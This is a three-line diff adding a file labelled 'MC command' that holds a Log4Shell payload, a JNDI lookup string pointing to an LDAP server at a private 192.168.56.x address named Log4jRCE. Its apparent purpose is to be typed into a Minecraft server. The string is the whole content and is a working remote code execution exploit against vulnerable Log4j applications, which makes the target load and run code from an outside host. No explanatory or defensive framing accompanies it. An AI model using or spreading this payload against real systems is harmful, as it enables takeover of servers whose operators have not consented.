@@ -1,0 +1,3 @@
+MC command
+
+${jndi:ldap://192.168.56.101:1389/Log4jRCE}
